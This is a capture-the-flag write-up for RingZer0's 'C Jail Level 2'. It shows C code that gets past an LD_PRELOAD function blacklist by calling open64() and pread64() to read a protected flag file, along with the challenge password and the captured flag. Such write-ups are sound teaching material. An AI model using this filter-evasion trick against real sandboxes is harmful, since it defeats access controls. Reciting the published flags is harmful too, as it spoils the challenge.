# Level 2

```shell
ssh level2@challenges.ringzer0team.com -p 10229 
password: FLAG-ql3mI2Z8fGq56kK5QdwK8oMxgWwvji8R

RingZer0 Team Online CTF

C Jail Level 2:
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge instruction:
-----------------------------

Type DONE to compile and execute your binary.


Your payload will be compiled that way:
gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin

Your payload will be executed that way:
LD_PRELOAD=./override.so ./bin

You only control the content of a function.

Here's the default includes
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

You CANNOT use the "asm" keyword

-----------------------------
Your C code:
```

Pretty much the same as in the first challenge. However, some functions like fopen, open, fdopen were not allowed. Finally I bought the hint:

Is there a 64 bits wrapper for open?

And of course there is open64(). open() and open64() use the open syscall internally. The main difference is that open64() is equivalent to open() with O_LARGEFILE in order to support large files in 32 bit applications. Here is my solution (shitty code, don't use in production :D):
```
-----------------------------
Your C code:
   char buffer[100];
    FILE *fp;
    int fd;
    fd = open64("flag.txt", O_RDONLY);
    pread64(fd, buffer, 100, 0);
    printf("flag: %s\n", buffer);
DONE

-----------------------------
Compiling your code.
/tmp/41d5ddc3-8d6b-42ce-a2cf-1026fcfe463f/bin.c: In function ‘_4fa8c04676486ca36ba261f8387a2b9d’:
/tmp/41d5ddc3-8d6b-42ce-a2cf-1026fcfe463f/bin.c:15:5: warning: implicit declaration of function ‘open64’ [-Wimplicit-function-declaration]
     fd = open64("flag.txt", O_RDONLY);
     ^
/tmp/41d5ddc3-8d6b-42ce-a2cf-1026fcfe463f/bin.c:16:5: warning: implicit declaration of function ‘pread64’ [-Wimplicit-function-declaration]
     pread64(fd, buffer, 100, 0);
     ^
/tmp/41d5ddc3-8d6b-42ce-a2cf-1026fcfe463f/bin.c:13:11: warning: unused variable ‘fp’ [-Wunused-variable]
     FILE *fp;
           ^
Executing your code.
flag: FLAG-0416ewrN2o058901Aqf4w9hsyH0dfqzd
```
